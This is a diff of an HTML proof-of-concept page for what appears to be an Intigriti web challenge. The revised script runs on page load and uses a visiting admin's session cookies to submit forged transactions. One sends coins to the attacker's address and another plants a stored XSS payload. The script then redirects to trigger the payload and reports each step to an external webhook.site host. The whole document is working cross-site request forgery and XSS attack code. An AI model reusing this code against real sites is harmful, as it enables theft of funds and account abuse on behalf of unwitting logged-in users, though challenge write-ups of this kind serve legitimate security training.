@@ -3,30 +3,50 @@
 <head><title>PoC</title></head>
 <body>
 <script>
-const BASE = 'https://challenge-0126.intigriti.io';
-const WEBHOOK = 'https://webhook.site/fd042032-f1e9-404c-b9b1-8fb39614db44';
+async function pwn() {
+  const BASE = 'https://challenge-0126.intigriti.io';
+  const WEBHOOK = 'https://webhook.site/bcf23067-6898-4c8d-9741-26589bcc4876';
+  const YOUR_ADDRESS = '10b5c9290725eeed3976d5dfe52fcbe23a';
+  const XSS_PAYLOAD = `<img src=x onerror="alert('gigawatz')">`;
 
-// XSS payload
-const xss = `<img src=x onerror="alert('gigawatz');new Image().src='${WEBHOOK}/?xss=1'">`;
+  // Track: Admin visited PoC
+  fetch(`${WEBHOOK}/?step=started`);
 
-// Direct API call - bypass checkout.html restrictions
-fetch(`${BASE}/api/transaction`, {
-  method: 'POST',
-  headers: {'Content-Type': 'application/json'},
-  credentials: 'include',
-  body: JSON.stringify({
-    toAddress: '10b5c9290725eeed3976d5dfe52fcbe23a',
-    currency: '1337COIN',
-    amount: 1,
-    nickname: xss
-  })
-}).then(r => r.json()).then(d => {
-  new Image().src = `${WEBHOOK}/?tx_status=ok`;
-  window.location = `${BASE}/marketwatch.html`;
-}).catch(e => {
-  new Image().src = `${WEBHOOK}/?tx_error=${encodeURIComponent(e.message)}`;
-  window.location = `${BASE}/marketwatch.html`;
-});
+  try {
+    // Transaction 1: Send 2 1337COIN to YOUR address (you get coins, can see flag)
+    const tx1 = await fetch(`${BASE}/api/transaction`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      credentials: 'include',
+      body: JSON.stringify({
+        toAddress: YOUR_ADDRESS,
+        currency: '1337COIN',
+        amount: 2
+      })
+    });
+    fetch(`${WEBHOOK}/?step=tx1_status_${tx1.status}`);
+
+    // Transaction 2: Send 2 1337COIN to XSS payload (shows in marketwatch, triggers alert)
+    const tx2 = await fetch(`${BASE}/api/transaction`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      credentials: 'include',
+      body: JSON.stringify({
+        toAddress: XSS_PAYLOAD,
+        currency: '1337COIN',
+        amount: 2
+      })
+    });
+    fetch(`${WEBHOOK}/?step=tx2_status_${tx2.status}`);
+
+    // Redirect to marketwatch to trigger XSS
+    fetch(`${WEBHOOK}/?step=redirecting`);
+    window.location = `${BASE}/marketwatch.html`;
+  } catch (e) {
+    fetch(`${WEBHOOK}/?error=${encodeURIComponent(e.message)}`);
+  }
+}
+pwn();
 </script>
 </body>
 </html>
